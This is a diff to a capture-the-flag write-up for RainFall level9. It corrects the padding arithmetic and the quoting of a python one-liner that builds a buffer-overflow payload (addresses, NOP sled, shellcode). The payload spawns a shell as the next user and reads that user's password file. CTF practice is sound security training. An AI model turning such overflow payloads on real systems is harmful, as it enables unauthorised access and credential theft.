@@ -73,10 +73,10 @@ level9
 		*	my older shellcode didn't work probably because of how the stack was dealing with the program so I used another one [here](src/shellcode.s) -> 27
 		*	address of buffer = 4 bytes
 		*	size of buffer = 108 bytes
-		*	108 - 23 - 4 = `77 bytes` of padding
+		*	108 - 27 - 4 = `77 bytes` of padding
 	*	And we get this :
 		```console
-		level9@RainFall:~$ ./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x90'*77 + shellcode + '\x0c\xa0\x04\x08')")
+		level9@RainFall:~$ ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x90"*77 + shellcode + "\x0c\xa0\x04\x08")')
 		$ whoami
 		bonus0
 		$ cat /home/user/bonus0/.pass
